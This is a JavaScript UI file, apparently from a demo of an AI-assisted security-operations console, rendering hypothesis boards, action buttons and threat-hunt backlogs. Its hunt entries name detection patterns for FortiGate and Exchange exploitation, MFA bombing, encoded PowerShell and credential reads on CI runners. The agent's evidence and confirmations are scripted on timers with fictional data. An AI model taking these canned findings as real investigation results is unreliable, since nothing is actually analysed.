    h+=`<div class="hypo ${hy.state}"><div class="hypo-top"><span class="hypo-state ${st.cls}">${ic(sIcon,11)} ${st.label}</span><span class="hypo-conf" title="Confidence: ${hy.confidence}"><span class="hcm l${lvl}"><i></i><i></i><i></i></span><span class="hcm-l">${hy.confidence}</span></span>${hypoAuthor(hy.author)}</div><div class="hypo-stmt">${hy.statement}</div>${ev?`<div class="hypo-ev">${ev}</div>`:''}${acts}</div>`;
  });
  return `<div class="hypo-board">${h}</div>`;
}
function buildRecActions(t){
  if(t.status==='resolved'||t.status==='auto-resolved') return '';
  if(t.recActions){ return t.recActions.map(a=>`<button class="brec-btn ${a.gated?'gated':''}" onclick="App.recStub('${a.label}')">${ic(a.gated?'lock':'bolt',12)} ${a.label}<span class="brec-x">${ic('arrow',12)}</span></button>`).join(''); }
  const taken=new Set((t.actions||[]).filter(a=>a.status!=='proposed').map(a=>a.kind)); const btns=[];
  const official = t.mode==='dayshift' ? t.isDayCase : t.isNightCase;
  if(!official){
    /* generic records recommend their own staged moves (same list as their brief card) */
    const ra=(AI_RADAR[t.id]||{}).actions||[];
    if(!ra.length) return '';
    return ra.map(a=>`<button class="brec-btn ${a.gated?'gated':''}" onclick="App.recStub('${(a.label||'').replace(/'/g,"\\'")}')">${ic(a.gated?'lock':'bolt',12)} ${a.label}<span class="brec-x">${ic('arrow',12)}</span></button>`).join('');
  }
  if(t.mode==='dayshift'){
    if(!taken.has('isolate') && t.status!=='contained') btns.push(['Isolate FIN-WS-04','isolate',true]);
    if(!taken.has('disable')) btns.push(['Disable svc-backup','disable',true]);
    if(t.type!=='incident') btns.push(['Convert to Incident','incident',true]);
    if((t.hypotheses||[]).some(h=>h.state==='confirmed')) btns.push(['Hunt this TTP on peer hosts','hunt',false]);
    if(!(t.assignees||[]).length) btns.push(['Assign to IR','assign',false]);
  } else {
    if(!taken.has('rollback')) btns.push(['Roll back to v2.8.0','rollback',true]);
    if(t.status==='awaiting') btns.push(['Adopt as official investigation','adopt',false]);
  }
  if(!btns.length) return '';
  return btns.map(([l,k,g])=>`<button class="brec-btn ${g?'gated':''}" onclick="App.recAction('${k}',event)">${ic(g?'lock':'bolt',12)} ${l}<span class="brec-x">${ic('arrow',12)}</span></button>`).join('');
}
function refreshDayAssessment(t){
  if(t.mode!=='dayshift') return;
  const taken=new Set((t.actions||[]).filter(a=>a.status!=='proposed').map(a=>a.kind));
  const conf=(t.hypotheses||[]).some(h=>h.state==='confirmed');
  if(taken.has('disable')||taken.has('isolate')){ const b=[]; if(taken.has('isolate'))b.push('host isolated'); if(taken.has('disable'))b.push('account disabled'); t.assessment='Contained — '+b.join(', ')+'. Confirmed credential compromise on FIN-WS-04.'; t.assessmentTone='ok'; return; }
  if(conf){ t.assessment='Confirmed hands-on-keyboard credential abuse — a live operator using stolen svc-backup credentials. Immediate containment advised.'; t.assessmentTone='crit'; return; }
  t.assessment='Active credential compromise on FIN-WS-04 with attempted lateral movement to FIN-DC-01. Not yet contained.'; t.assessmentTone='warn';
}

/* hypothesis loop — scripted for the NotDaybreak hero; generic prompt elsewhere */
function formHypothesis(){
  const t=curThread();
  if(t.type==='chat'){ toast('info','Promote first','Hypotheses live on a record. Promote this thread, then form one.'); return; }
  initBrief(t);
  if(t.id!=='day-1' || t.hypotheses.some(h=>h.id==='h-cred')){
    toast('info','State your hypothesis','Tell me your theory in chat and I’ll gather evidence for and against.');
    pushMsg({role:'agent',prose:`What’s your hypothesis? State it and I’ll investigate — pulling evidence for and against, then proposing next steps that get written into the brief.`});
    return;
  }
  clearSuggestions();
  pushMsg({role:'user',text:`I think svc-backup was stolen for hands-on-keyboard lateral movement — a person at the keyboard, not automated malware.`});
  const h={id:'h-cred',statement:'svc-backup was stolen for hands-on-keyboard lateral movement — an interactive operator, not automated malware.',author:'you',state:'investigating',confidence:'forming',forIds:[],againstIds:[],actions:[]};
  t.hypotheses.push(h);
  t.assessment='Testing whether this is a hands-on-keyboard intrusion. Credential compromise confirmed; operator attribution in progress.'; t.assessmentTone='warn';
  regenBrief(t,'Hypothesis opened: hands-on-keyboard');
  setTimeout(()=>{
    pushMsg({role:'agent',tool:{icon:'investigation',label:'Endpoint · session + logon analysis (FIN-WS-04)',
      query:'host.name:"FIN-WS-04" user.name:"svc-backup"  logon.type, command cadence  window 7h',
      result:`<div class="ptree"><div>logon.type <span class="ext">10 (RemoteInteractive)</span> <span style="color:var(--red-d)">— svc-backup is non-interactive by policy</span></div><div class="lvl">interactive shell · 41 commands typed over 6 min <span style="color:var(--ink-4)">(human cadence, not a scripted burst)</span></div><div class="lvl">no scheduled-task or service parent — launched in-session</div></div>`}});
    h.forIds=['ev-interactive','ev-cadence','ev-noparent'];
    // the investigation produces real, source-backed evidence — pushed into the Evidence tab and linked
    if(!evById(t,'ev-cadence')) t.evidence.push({id:'ev-cadence',t:'Human command cadence',src:'Endpoint · session telemetry (FIN-WS-04)',snap:'41 interactive commands typed over 6 min\ninter-keystroke timing consistent with a human',live:'session ended',why:'Command rhythm matches human typing, not an automated script burst.',icon:'terminal',mv:'session: interactive'});
    if(!evById(t,'ev-noparent')) t.evidence.push({id:'ev-noparent',t:'No automation parent',src:'Endpoint · process lineage (FIN-WS-04)',snap:'powershell.exe parent = services.exe (in-session)\nno scheduled-task / service trigger',live:'confirmed',why:'No scheduler or service launched the session — it was driven live in an interactive shell.',icon:'host',mv:'parent: services.exe'});
    markBriefStale(t,'Evidence attached to hypothesis');
    pushMsg({role:'agent',name:false,prose:`The evidence supports it: an <b>interactive (type 10)</b> logon on a non-interactive account, <b>41 typed commands at human cadence</b>, and no scheduled-task parent. This reads as a person at the keyboard.`});
    setTimeout(()=>{
      h.state='confirmed'; h.confidence='high';
      h.actions=[{label:'Disable svc-backup',kind:'disable',gated:true},{label:'Convert to Incident',kind:'incident',gated:true},{label:'Hunt this TTP on peers',kind:'hunt',gated:false}];
      t.timeline.push({time:nowHM(),cls:'crit',txt:`<b>Hypothesis confirmed</b> — hands-on-keyboard operator (interactive logon, human cadence)`});
      refreshDayAssessment(t);
      regenBrief(t,'Hypothesis confirmed: hands-on-keyboard');
      pushMsg({role:'agent',name:false,prose:`<b>Confirmed</b> and written into the brief. Given a live operator, I’d disable <code>svc-backup</code> now, escalate to an incident, and hunt this TTP on peer hosts — the actions are in the brief.`});
      setSuggestions([
        {label:"Disable svc-backup",icon:'userx',fn:()=>startAction('disable')},
        {label:"Convert to Incident",icon:'siren',fn:()=>startAction('incident')},
        {label:"Hunt this TTP on peers",icon:'investigation',fn:()=>huntPeers()},
      ]);
    },3000);
  },3300);
}
function huntPeers(){
  const t=curThread(); clearSuggestions();
  pushMsg({role:'user',text:'Hunt this TTP on peer hosts.'});
  thinking('Hunting interactive service-account logons across the fleet…',()=>{
    pushMsg({role:'agent',tool:{icon:'investigation',label:'Fleet hunt · interactive service-account logons',
      query:'user.name:(service account) AND logon.type:10  across all hosts  window 7d',
      result:`<div class="res-stat"><div class="stat"><div class="v">1</div><div class="k">host affected</div></div><div class="stat"><div class="v">0</div><div class="k">other svc accts</div></div><div class="stat"><div class="v amber">FIN-WS-04</div><div class="k">only match</div></div></div>`}});
    pushMsg({role:'agent',name:false,prose:`The TTP is contained to <b>FIN-WS-04</b> — no other service account shows interactive logons in the last 7 days. This looks isolated to the one compromised host.`});
    t.timeline.push({time:nowHM(),cls:'',txt:'<b>Fleet hunt</b> — interactive svc-account logons isolated to FIN-WS-04'});
    markBriefStale(t,'Fleet hunt: TTP isolated to FIN-WS-04');
    setSuggestions([{label:"Disable svc-backup",icon:'userx',fn:()=>startAction('disable')},{label:"Convert to Incident",icon:'siren',fn:()=>startAction('incident')}]);
  },950);
}

/* ============================================================ PANEL: MULTI-APP WORKSPACE */
/* ============================================================ MAIN NAV RAIL + destinations */
const DEST_META={
  discover:{label:'Discover',icon:'compass',sub:'Explore raw events'},
  dashboards:{label:'Dashboards',icon:'grid',sub:'Overview & trends'},
  alerts:{label:'Alerts',icon:'alert',sub:'Open detections'},
  discoveries:{label:'Attacks',icon:'siren',sub:'AI-correlated attack chains'},
  deepwatch:{label:'Deep Watch',icon:'terminal',sub:'Specialist investigation workbench'},
  records:{label:'Records',icon:'list',sub:'Cases, incidents & hunts'},
  hunt:{label:'Threat hunt',icon:'target',sub:'Hypothesis-driven search'},
  streams:{label:'Streams',icon:'streams',sub:'Ingest pipelines'},
  agents:{label:'Watches',icon:'eye',sub:'Watch coverage, autonomy & schedule'},
  skills:{label:'Skills',icon:'layers',sub:'Capabilities & connectors agents draw on'},
  workflows:{label:'Workflows',icon:'workflow',sub:'Triggered runs across watches'},
  activity:{label:'Activity',icon:'pulse',sub:'Agent run & trust ledger'},
  guardrails:{label:'Guardrails',icon:'shield',sub:'Autonomy, approvals & data policy'},
};
function renderRail(){
  const r=document.getElementById('rail'); if(!r) return;
  const nav=state.nav||{showLabels:true,apps:[]}; const showL=nav.showLabels!==false;
  r.classList.toggle('labeled',showL);
  const mode=state.mode||'dayshift';
  const solIcon=mode==='nightshift'?'moon':'sun'; const solName=mode==='nightshift'?'NightShift':'NotDaybreak';
  const role=mode==='nightshift'?'Staff SRE':'Senior Analyst';
  const navView=state.navView||'brief';
  const solOn = state.dest==='home' && navView==='brief';
  const chatsOn = state.dest==='home' && navView!=='brief';
  let top=`<button class="rail-item sol ${solOn?'on':''}" title="${solName} · Brief" onclick="App.goBrief()"><span class="rii">${ic(solIcon,16)}</span>${showL?`<span class="ril">${solName}</span>`:''}</button>`;
  top+=`<button class="rail-item ${chatsOn?'on':''}" title="Chats" onclick="App.goChats()"><span class="rii">${ic('comment',16)}</span>${showL?`<span class="ril">Chats</span>`:''}</button><div class="rail-sep"></div>`;
  const agentMode=!!nav.agentMode;
  const agentViews=[
    {key:'agents',label:'Watches',icon:'eye'},
    {key:'workflows',label:'Workflows',icon:'workflow'},
    {key:'skills',label:'Skills',icon:'layers'},
    {key:'activity',label:'Activity',icon:'sx-activity'},
    {key:'performance',label:'Performance',icon:'pulse'},
    {key:'guardrails',label:'Guardrails',icon:'shield'},
  ];
  const list=(nav.apps||[]).filter(a=>a.visible && !(agentMode && a.group==='operate') && !(mode!=='dayshift' && (a.key==='discoveries'||a.key==='deepwatch')));
  list.forEach(a=>{
    if(agentMode && a.group==='agent'){
      agentViews.forEach(v=>{
        const on=state.dest==='agents' && (state.agentsView||'agents')===v.key;
        top+=`<button class="rail-item ${on?'on':''}" title="${v.label}" onclick="App.go('${v.key}')"><span class="rii">${ic(v.icon,16)}</span>${showL?`<span class="ril">${v.label}</span>`:''}</button>`;
      });
      return;
    }
    top+=`<button class="rail-item ${state.dest===a.key?'on':''}" title="${a.label}" onclick="App.go('${a.key}')"><span class="rii">${ic(a.icon,16)}</span>${showL?`<span class="ril">${a.label}</span>`:''}</button>`;
  });
  top+=`<div class="rail-sep"></div><button class="rail-item more" title="Edit navigation" onclick="App.openNavPrefs()"><span class="rii">${ic('dots',16)}</span>${showL?`<span class="ril">More</span>`:''}</button>`;
  const bottom=`
    <button class="rail-item rail-tour" title="What's new — take a tour" onclick="App.startTour()"><span class="rii">${ic('tour',16)}</span>${showL?`<span class="ril">Tour</span>`:''}</button>
    <button class="rail-item" title="Demo run-of-show — presenter script" onclick="window.open('./demo-script/','_blank')"><span class="rii">${ic('doc',16)}</span>${showL?`<span class="ril">Script</span>`:''}</button>
    <button class="rail-item" title="Settings · solution & restart" onclick="App.openSettings(event)"><span class="rii">${ic('settings',16)}</span>${showL?`<span class="ril">Settings</span>`:''}</button>
    <button class="rail-item" title="Help" onclick="App.stub('Help')"><span class="rii">${ic('help',16)}</span>${showL?`<span class="ril">Help</span>`:''}</button>
    <button class="rail-item" title="You — ${role}" onclick="App.togglePerm(event)"><span class="rav" style="background-image:url('avatars/you.jpg');background-size:cover;background-position:center;color:transparent">YU</span>${showL?`<span class="ril">You</span>`:''}</button>`;
  r.innerHTML=`<div class="rail-top">${top}</div><div class="rail-bottom">${bottom}</div>`;
}
function panelToggleBtn(){ const open=!!state.inspectorOpen; return `<button class="panel-toggle ${open?'on':''}" title="${open?'Hide panel':'Show panel'}" onclick="App.toggleInspector()">${ic(open?'panelfill':'panel',16)}</button>`; }
function railSettingsHTML(){ const day=(state.mode||'dayshift')==='dayshift'; const darkOn=document.body.classList.contains('theme-dark');
  return `<div class="rp-label">Solution</div>
  <div class="rp-modes">
    <button class="rp-mode ${day?'on':''}" style="${day?'background:linear-gradient(135deg,#e89a3f,#d2761c)':''}" onclick="App.setMode('dayshift');App.closeRailPops()">${ic('sun',14)} NotDaybreak</button>
    <button class="rp-mode ${!day?'on':''}" style="${!day?'background:linear-gradient(135deg,#7b6ce8,#564ab6)':''}" onclick="App.setMode('nightshift');App.closeRailPops()">${ic('moon',14)} NightShift</button>
  </div>
  <div class="rp-sep"></div>
  <div class="rp-label">Theme</div>
  <div class="rp-modes">
    <button class="rp-mode ${!darkOn?'on':''}" style="${!darkOn?'background:linear-gradient(135deg,#5a8de0,#2f6bc4)':''}" onclick="App.setTheme(false)">${ic('sun',14)} Light</button>
    <button class="rp-mode ${darkOn?'on':''}" style="${darkOn?'background:linear-gradient(135deg,#2c3e5c,#141f33)':''}" onclick="App.setTheme(true)">${ic('moon',14)} Dark</button>
  </div>
  <div class="rp-sep"></div>
  <button class="rp-item" onclick="window.open('./demo-script/','_blank');App.closeRailPops()">${ic('doc',14)} Demo run-of-show</button>
  <div class="rp-sep"></div>
  <button class="rp-item" onclick="App.restart();App.closeRailPops()">${ic('restart',14)} Restart demo</button>`;
}
let _railPopH=null;
function positionRailPop(pop,anchor){ const r=anchor.getBoundingClientRect(); pop.style.left=(r.right+10)+'px'; pop.style.top='auto'; pop.style.bottom=(window.innerHeight-r.bottom)+'px'; }
function armRailPopClose(){ if(_railPopH) document.removeEventListener('mousedown',_railPopH); _railPopH=(ev)=>{ if(ev.target.closest('.perm-pop')||ev.target.closest('.rail-pop')||ev.target.closest('.rail-item')) return; if(window.App) App.closeRailPops(); document.removeEventListener('mousedown',_railPopH); _railPopH=null; }; setTimeout(()=>document.addEventListener('mousedown',_railPopH),50); }
function applySecondary(){ const np=document.getElementById('navPanel'); if(np){ const onHome=state.dest==='home'; np.hidden=!onHome; np.classList.toggle('collapsed', !onHome || state.navView==='brief' || !(state.nav&&state.nav.showSecondary!==false)); } }
function renderStage(){
  const home=document.getElementById('homeView'), page=document.getElementById('appPage'), np=document.getElementById('navPanel'); if(!home||!page) return;
  const onHome=state.dest==='home';
  home.hidden=!onHome; page.hidden=onHome;
  if(!onHome) renderAppPage(state.dest);
  if(np){ np.hidden=!onHome; np.classList.toggle('collapsed', !onHome || state.navView==='brief' || !(state.nav&&state.nav.showSecondary!==false)); }
}
function renderAppPage(dest){
  const c=document.getElementById('appPage'); if(!c) return;
  if(dest==='dashboards'){ c.style.background='transparent'; c.style.border='none'; c.style.boxShadow='none'; renderDashboardsPage(c); return; }
  if(dest==='agents'){ c.style.background='transparent'; c.style.border='none'; c.style.boxShadow='none'; renderAgentsHubPage(c); return; }
  c.style.background=''; c.style.border=''; c.style.boxShadow='';
  const m=DEST_META[dest]||{label:dest,icon:'grid',sub:''};
  c.innerHTML=`<div class="page-head"><div class="page-title">${ic(m.icon,18)} ${m.label}<span class="page-sub">${m.sub||''}</span></div><div class="page-actions">${pageActions(dest)}</div></div><div class="page-body" id="pageBody"></div>`;
  const b=document.getElementById('pageBody'); if(!b) return;
  if(dest==='discover') renderDiscover(b);
  else if(dest==='records') renderRecords(b);
  else if(dest==='alerts') renderAlerts(b);
  else if(dest==='dashboards') renderDashboardsPage(b);
  else if(dest==='hunt') renderHuntPage(b);
  else if(dest==='discoveries') renderDiscoveriesPage(b);
  else if(dest==='deepwatch') renderDeepWatchPage(b);
  else if(dest==='streams') renderStreamsPage(b);
  else b.innerHTML='';
}
function pageActions(dest){
  if(dest==='hunt') return `<button class="pill-btn ghost" onclick="App.go('home')">${ic('panel',13)} Conversation</button><button class="pill-btn" onclick="App.focusHuntComposer()">${ic('plus',13)} New hunt</button>`;
  const map={discover:'Save search',dashboards:'New dashboard',alerts:'Manage rules',records:'New case',hunt:'New hunt',streams:'New stream',discoveries:'Run discovery',agents:'New watch',skills:'Add skill',workflows:'New workflow',activity:'Export log',performance:'Export report',guardrails:'Edit policy'};
  /* Agent-ops hub pages (watches & friends) don't link back to the conversation. */
  const noConvo=['agents','workflows','skills','activity','performance','guardrails'].includes(dest);
  const convo=noConvo?'':`<button class="pill-btn ghost" onclick="App.go('home')">${ic('panel',13)} Conversation</button>`;
  return `${convo}<button class="pill-btn" onclick="App.stub('${map[dest]||'New'}')">${ic('plus',13)} ${map[dest]||'New'}</button>`;
}
function renderHuntPage(b){
  const S=huntSet();
  const chips=S.saved.map(s=>`<button class="hunt-chip" onclick="App.runAdhoc('${s.replace(/'/g,"\\'")}')">${s}</button>`).join('');
  const secs=S.groupOrder.map(k=>{
    const g=S.groups[k]; const items=S.backlog.filter(h=>h.group===k);
    if(!items.length) return '';
    return `<section class="hxsec" style="--grp:${g.color}">
      <div class="hxsec-h"><span class="hxsec-dot"></span><span class="hxsec-l">${g.label}</span><span class="hxsec-n">${items.length}</span><span class="hxsec-note">${g.note}</span></div>
      ${items.map(huntRowHTML).join('')}
    </section>`;
  }).join('');
  b.innerHTML=`<div class="page-pad"><div class="huntx">
    <div class="hx-composer">${ic('target',16)}<input id="huntInput" class="hx-input" placeholder="${S.ph}" onkeydown="App.huntKey(event)"><button class="hx-go" onclick="App.runAdhoc()">${ic('target',13)} Run hunt</button></div>
    <div class="hx-saved"><span class="hxs-k">Saved hunts</span>${chips}</div>
    ${adhocHTML()}
    <div class="hx-ski">
      <button class="hx-ski-top" onclick="App.openSki()">
        <span class="hx-ski-ic">${ic(S.knowIcon,16)}</span>
        <span class="hx-ski-b"><span class="hx-ski-t">${S.knowLabel}</span><span class="hx-ski-m">${S.knowMeta}</span></span>
        <span class="hx-ski-go">What drives the backlog ${ic('arrow',12)}</span>
      </button>
      <div class="hx-ski-gaps"><span class="hxg-k">${S.gapWord}</span>${S.gaps.map(g=>{const p=g.ttp.split(' — ');return `<button class="hxg-chip" title="${g.cov==='none'?'No coverage':'Partial coverage'} — jump to the hunt" onclick="App.skiHunt('${g.hunt}')"><span class="hxg-dot ${g.cov}"></span><code>${p[0]}</code>${p[1]||''}</button>`;}).join('')}</div>
    </div>
    ${secs}
    <div style="height:28px"></div>
  </div></div>`;
}
/* ---- Scenario 5: continuous hunt driven by Security Knowledge Indicators ---- */
const SKI_TECH=[
  {name:'FortiGate',icon:'shield',meta:'7.2.x · 6 appliances, internet-facing',kev:'CVE-2024-21762'},
  {name:'Microsoft Exchange',icon:'at',meta:'2019 CU13 · 2 hosts',kev:'CVE-2024-21410'},
  {name:'Okta Workforce',icon:'user',meta:'SSO · 1.2k identities',kev:null},
  {name:'Kubernetes',icon:'layers',meta:'v1.28 · 3 clusters',kev:null},
  {name:'GitHub Actions',icon:'terminal',meta:'4 self-hosted runners',kev:null},
  {name:'AWS IAM',icon:'db',meta:'2 accounts · 340 roles',kev:null},
];
const SKI_GAPS=[
  {ttp:'T1621 — MFA fatigue / request bombing',cov:'none',hunt:'hb3'},
  {ttp:'T1190 — Exploit public-facing app (FortiGate)',cov:'partial',hunt:'hb1'},
  {ttp:'T1078.002 — Service accounts on the server tier',cov:'partial',hunt:'hb1'},
  {ttp:'T1098.001 — Additional cloud credentials (AWS IAM)',cov:'none',hunt:'hb5'},
];
const HUNT_GROUPS={
  kev:{label:'Known-exploited vulnerabilities',color:'var(--red)',note:'observed tech with active KEVs'},
  gap:{label:'Detection coverage gaps',color:'var(--amber)',note:'TTPs no rule covers today'},
  surface:{label:'Attack-surface changes',color:'var(--blue)',note:'recently observed in your environment'},
};
const HUNT_BACKLOG=[
  {id:'hb1',score:88,sev:'var(--red)',group:'kev',title:'FortiGate pre-auth exploitation',ttp:'T1190',driver:'KEV · observed: FortiGate 7.2.x on 6 internet-facing appliances',
    hypo:'If the FortiOS SSL-VPN out-of-bounds write (CVE-2024-21762) is being exploited, crafted requests to <code>/remote/*</code> are followed by anomalous child processes on the appliance.',
    sources:['fortigate-*','network flows','EDR'],outcome:'Confirm or rule out exploitation of the KEV on internet-facing appliances.',
    finding:'sse',
    find:{tag:'Significant event',head:'Interactive service-account logon found on FIN-DB-02',body:'The FortiGate hunt pivoted into the fleet and surfaced a <b>type-10 (interactive) logon</b> by <code>svc-backup</code> on <b>FIN-DB-02</b> — landing <b>after</b> your earlier fleet sweep came back clean. The existing rule only watches workstation subnets, so the <b>DB tier is blind</b> to it. One host affected — worth turning into a durable detection.',promote:'Promote to detection',escalate:'Escalate',esT:'Escalated',esB:'Significant Security Event escalated — a case has been drafted with the hunt evidence attached.',dismiss:'Logged with rationale. The indicator stays tracked.'}},
  {id:'hb2',score:74,sev:'var(--amber)',group:'kev',title:'Exchange CVE-2024-21410 NTLM relay',ttp:'T1557',driver:'KEV · observed: Exchange 2019 CU13 on 2 hosts',
    hypo:'NTLM relay to Exchange would show privileged EWS access from accounts that don’t normally use it, shortly after authentication from unusual hosts.',
    sources:['exchange-*','auth logs'],outcome:'Detect privilege escalation via relayed NTLM against Exchange.'},
  {id:'hb3',score:66,sev:'var(--amber)',group:'gap',title:'Okta MFA fatigue / session hijack',ttp:'T1621',driver:'Coverage gap · Okta is the SSO for 1.2k identities',
    hypo:'MFA-bombing or token theft shows as a burst of push challenges then a satisfied MFA from a new ASN/device for the same identity.',
    sources:['okta system log'],outcome:'Surface accounts with anomalous MFA-then-success patterns.'},
  {id:'hb4',score:52,sev:'var(--blue)',group:'surface',title:'GitHub Actions runner abuse',ttp:'T1195.002',driver:'Observed: 4 self-hosted runners with repo write',
    hypo:'A poisoned workflow would spawn outbound connections or credential reads from a runner outside normal CI patterns.',
    sources:['runner host EDR','github audit'],outcome:'Find CI runners executing out-of-policy commands.'},
  {id:'hb5',score:41,sev:'var(--blue)',group:'gap',title:'AWS IAM privilege escalation',ttp:'T1098.001',driver:'Coverage gap · 2 AWS accounts, 340 roles',
    hypo:'Escalation shows as a principal attaching a permissive policy or creating access keys for a role it doesn’t own.',
    sources:['cloudtrail'],outcome:'Detect self-escalation paths in IAM.'},
];
/* ---- NightShift parallel: reliability hunting ---- */
const NHUNT_GROUPS={
  budget:{label:'Error-budget risk',color:'var(--red)',note:'services burning budget or near breach'},
  blind:{label:'Monitoring blind spots',color:'var(--amber)',note:'critical paths with no SLO or alert'},
  change:{label:'Recent changes to watch',color:'var(--blue)',note:'deploys & config in the last 24h'},
};
const NHUNT_BACKLOG=[
  {id:'nb1',score:86,sev:'var(--red)',group:'budget',title:'Silent error sources burning search-api budget',tag:'error budget',driver:'Budget risk · search-api at 4× burn, 30-day budget 96% spent',
    hypo:'If the budget burns faster than visible 5xx explains, errors are being masked as <code>200</code>s — empty results or truncated bodies after an upstream timeout — hiding inside the p99 tail.',
    sources:['APM traces','SLO burn','access logs'],outcome:'Find the unlogged error class draining the budget.',
    finding:'sig',
    find:{tag:'Significant finding',head:'Silent “200-but-empty” responses on search-api',body:'The budget hunt pivoted through the p99 tail and found <b>~2.3% of search-api responses return HTTP 200 with an empty body</b> after an upstream timeout — counted as success today, so they burn the error budget <b>invisibly</b>. No SLI captures this. Worth turning into a durable monitor.',promote:'Promote to SLO monitor',escalate:'Open incident',esT:'Incident opened',esB:'A reliability incident was drafted with the hunt evidence and the affected SLO attached.',dismiss:'Logged with rationale. The signal stays tracked.'}},
  {id:'nb2',score:78,sev:'var(--blue)',group:'change',title:'Deploy-correlated p99 regressions across services',tag:'deploy',driver:'Change · 6 deploys in the last 24h touching hot paths',
    hypo:'A deploy that regresses latency shows a step change in p99 within ~15 min of rollout, isolated to a single span rather than fleet-wide load.',
    sources:['deploys','APM traces'],outcome:'Catch regressions before the SLO alert is slow to fire.'},
  {id:'nb3',score:71,sev:'var(--red)',group:'budget',title:'Connection-pool saturation trend — payments-api',tag:'saturation',driver:'Budget risk · payments-api pool at 82%, climbing ~3%/h',
    hypo:'Pool exhaustion appears as rising acquire-wait time before any errors — checked-out connections trend toward max with growing latency at the edge.',
    sources:['pool metrics','APM'],outcome:'Predict saturation before it turns into 5xx.'},
  {id:'nb4',score:64,sev:'var(--amber)',group:'blind',title:'Unmonitored critical path — cart → inventory',tag:'no SLO',driver:'Blind spot · cart→inventory dependency has no SLO or alert',
    hypo:'Retry amplification on this path would show inventory request volume rising super-linearly with cart errors — invisible today with no SLI on the edge.',
    sources:['service map','APM'],outcome:'Cover a dependency that already caused a cascade.'},
  {id:'nb5',score:52,sev:'var(--blue)',group:'change',title:'Config pushes that skipped canary — 3 services',tag:'config',driver:'Change · 3 config pushes bypassed the canary window in 24h',
    hypo:'A risky config change shows as a metric shift with no preceding canary stage in the deploy record — the change went straight to 100%.',
    sources:['config audit','deploys'],outcome:'Surface changes that skipped progressive rollout.'},
  {id:'nb6',score:44,sev:'var(--amber)',group:'blind',title:'Memory-limit blind spots after model bump',tag:'no alert',driver:'Blind spot · recommendation-svc limits unchanged since model v3',
    hypo:'Under-provisioned pods show RSS approaching the cgroup ceiling with rising GC, then OOMKills — with no alert set to catch the trend.',
    sources:['container metrics','k8s events'],outcome:'Find pods trending to OOM with no alert set.'},
];
const NSKI_TECH=[
  {name:'search-api',icon:'search',meta:'p99 tail · 30-day SLO 99.9%',kev:'Budget 96% spent · 4× burn'},
  {name:'payments-api',icon:'db',meta:'connection pool climbing',kev:'Pool 82%'},
  {name:'checkout-service',icon:'pulse',meta:'p99 520ms · SLO 300ms',kev:'Breaching'},
  {name:'kafka-broker',icon:'layers',meta:'consumer lag 480k · disk 68%',kev:null},
  {name:'inventory-svc',icon:'network',meta:'critical path · no SLO defined',kev:null},
  {name:'recommendation-svc',icon:'bot',meta:'mem limits unchanged since v3',kev:null},
];
const NSKI_GAPS=[
  {ttp:'cart→inventory — no SLO or alert',cov:'none',hunt:'nb4'},
  {ttp:'recommendation-svc — no OOM alert',cov:'none',hunt:'nb6'},
  {ttp:'3 services — pushed without canary',cov:'partial',hunt:'nb5'},
  {ttp:'search-api — budget alert only, no cause',cov:'partial',hunt:'nb1'},
];
const NIGHT_HUNT_ROWS=[
  {risk:'high',why:'burning',sig:'error budget',svc:'search-api',val:'96% spent · 4× burn',win:'last 15m'},
  {risk:'medium',why:'climbing',sig:'connection pool',svc:'payments-api',val:'82% used',win:'now'},
  {risk:'medium',why:'elevated',sig:'5xx rate',svc:'payments-api',val:'0.9%',win:'last 1h'},
  {risk:'low',why:'watch',sig:'consumer lag',svc:'kafka-broker-3',val:'480k msgs · draining',win:'now'},
  {risk:'low',why:'ok',sig:'GC pause p99',svc:'ingest-worker',val:'220ms',win:'last 30m'},
];
function nightEventsTable(){
  const rows=NIGHT_HUNT_ROWS.map(e=>`<tr class="ev-row ${e.risk==='high'?'flag':''}">
    <td><span class="risk-pill" style="color:${riskColor(e.risk)};background:${riskBg(e.risk)}">${e.why}</span></td>
    <td class="mono">${e.sig}</td>
    <td class="mono">${e.svc}</td>
    <td class="mono">${e.val}</td>
    <td class="mono">${e.win}</td>
  </tr>`).join('');
  return `<div class="events-card">
    <div class="events-h">${ic('pulse',13)} <b>${NIGHT_HUNT_ROWS.length} anomalies</b> across 4 services <span class="ev-hint">— read-only snapshot</span><button class="discover-link" onclick="App.viewInDiscover()">${ic('compass',13)} Open in APM ${ic('arrow',11)}</button></div>
    <div class="ev-scroll"><table class="ev-table">
      <thead><tr><th>Verdict</th><th>Signal</th><th>Service</th><th>Value</th><th>Window</th></tr></thead>
      <tbody>${rows}</tbody></table></div>
  </div>`;
}
function huntSet(){
  const night=(state.mode||'dayshift')==='nightshift';
  if(night) return {
    backlog:NHUNT_BACKLOG, groups:NHUNT_GROUPS, groupOrder:['budget','blind','change'],
    tech:NSKI_TECH, gaps:NSKI_GAPS,
    knowIcon:'pulse', knowLabel:'Reliability knowledge', gapWord:'Blind spots',
    knowMeta:'6 services observed · 2 at budget risk — refreshed 8m ago', refreshed:'8m ago',
    knowLead:'Hunts are driven by what’s actually <b>running in production</b> — observed services, their SLOs and error budgets, dependency changes, and where monitoring is thin.',
    knowNote:'NightShift refreshes these signals continuously — new deploys, SLO burn, and dependency changes reshape the backlog without you asking. Blind spots sit on the hunt page itself, next to the hunts they seed.',
    techHead:'Observed services & exposure', techSub:'6 in scope · 2 at budget risk',
    ph:'Hunt anomalies across services — latency, error rate, saturation',
    saved:['p99 regressions','Error-rate spikes','Deploys vs latency'],
    driverTitle:'Open reliability knowledge', thread:'night-1',
    findWord:'Significant finding', noFind:'No reliability findings — logged, signal stays tracked.',
    doneMain:'Hunt complete — no reliability findings', doneSub:'logged · the signal stays tracked',
    dismissMsg:'Hunt removed from the backlog. The signal that generated it stays tracked.',
  };
  return {
    backlog:HUNT_BACKLOG, groups:HUNT_GROUPS, groupOrder:['kev','gap','surface'],
    tech:SKI_TECH, gaps:SKI_GAPS,
    knowIcon:'shield', knowLabel:'Security knowledge', gapWord:'Coverage gaps',
    knowMeta:'6 technologies observed · 2 active KEVs — refreshed 32m ago', refreshed:'32m ago',
    knowLead:'Hunts are driven by what’s actually <b>in your environment</b> — observed technologies, their known-exploited vulnerabilities, the current TTPs that target them, and where detection coverage is thin.',
    knowNote:'NotDaybreak refreshes these indicators continuously — new KEVs, technology changes, and coverage analysis reshape the backlog without you asking. Coverage gaps sit on the hunt page itself, next to the hunts they seed.',
    techHead:'Observed technologies & exposure', techSub:'6 in scope · 2 with active KEVs',
    ph:'Hunt across the fleet — e.g. interactive logons by service accounts',
    saved:['Encoded PowerShell','Service-account interactive logons','Rare external C2'],
    driverTitle:'Open security knowledge', thread:'day-1',
